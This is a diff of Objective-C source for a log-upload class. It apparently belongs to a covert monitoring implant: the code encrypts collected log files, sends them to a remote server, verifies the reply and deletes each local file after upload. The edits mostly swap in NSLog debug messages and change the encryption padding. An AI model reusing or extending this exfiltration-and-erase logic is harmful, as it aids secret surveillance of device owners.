@@ -19,9 +19,7 @@
 #import "NSData+SHA1.h"
 
 #import "RCSICommon.h"
-//#import "RCSMLogger.h"
-//#import "RCSMDebug.h"
-
+//#define DEBUG_LOG_NOP
 
 @interface LogNetworkOperation (private)
 
@@ -40,7 +38,7 @@
   if (aLogData == nil)
     {
 #ifdef DEBUG_LOG_NOP
-      errorLog(@"aLogData is nil");
+      NSLog(@"%s: aLogData is nil", __FUNCTION__);
 #endif
       
       return NO;
@@ -67,7 +65,9 @@
   infoLog(@"commandData: %@", commandData);
 #endif
   
-  [commandData encryptWithKey: gSessionKey];
+  // XXX- check the encryption !!!
+  //[commandData encryptWithKey: gSessionKey];
+  [commandData encryptWithKeyUsingPKCS7Padding: gSessionKey];
   
   //
   // Send encrypted message
@@ -82,7 +82,7 @@
   if (replyData == nil/* or == null*/)
     {
 #ifdef DEBUG_LOG_NOP
-      errorLog(@"empty reply from server");
+      NSLog(@"%s: replyData is nil", __FUNCTION__);
 #endif
       [commandData release];
       [outerPool release];
@@ -120,7 +120,7 @@
   @catch (NSException *e)
     {
 #ifdef DEBUG_LOG_NOP
-      errorLog(@"exception on sha makerange (%@)", [e reason]);
+      NSLog(@"%s: exception on sha makerange (%@)", __FUNCTION__, [e reason]);
 #endif
       
       [replyDecrypted release];
@@ -140,7 +140,7 @@
   if ([shaRemote isEqualToData: shaLocal] == NO)
     {
 #ifdef DEBUG_LOG_NOP
-      errorLog(@"sha mismatch");
+      NSLog(@"%s: sha mismatch", __FUNCTION__);
 #endif
       
       [replyDecrypted release];
@@ -153,7 +153,7 @@
   if (command != PROTO_OK)
     {
 #ifdef DEBUG_LOG_NOP
-      errorLog(@"Server issued a PROTO_%d", command);
+      NSLog(@"%s: Server issued a PROTO_%d", __FUNCTION__, command);
 #endif
       
       [replyDecrypted release];
@@ -225,6 +225,8 @@
 
   int logCount = [logManager getSendLogItemCount];
   
+  NSLog(@"%s: try sending %d logs", __FUNCTION__, logCount);
+  
   NSMutableIndexSet *sendedItem  = [NSMutableIndexSet indexSet];
   
   //
@@ -242,18 +244,21 @@
       if ([[NSFileManager defaultManager] fileExistsAtPath: logName] == TRUE)
         {
           NSData *logContent  = [NSData dataWithContentsOfFile: logName];
-
+          
           if ([self _sendLogContent: logContent] == YES)
             {
               [sendedItem addIndex:i];
+              NSLog(@"%s: sending log file (%@) OK!", __FUNCTION__, logName);
               if ([[NSFileManager defaultManager] removeItemAtPath: logName
                                                          error: nil] == NO)
                 {
 #ifdef DEBUG_LOG_NOP
-                errorLog(@"Error while removing (%@) from fs", logName);
+                  NSLog(@"%s: Error while removing (%@)", __FUNCTION__, logName);
 #endif
                 }
             }
+          else
+            NSLog(@"%s: error sending log file (%@)", __FUNCTION__, logName);
         }
     }
   
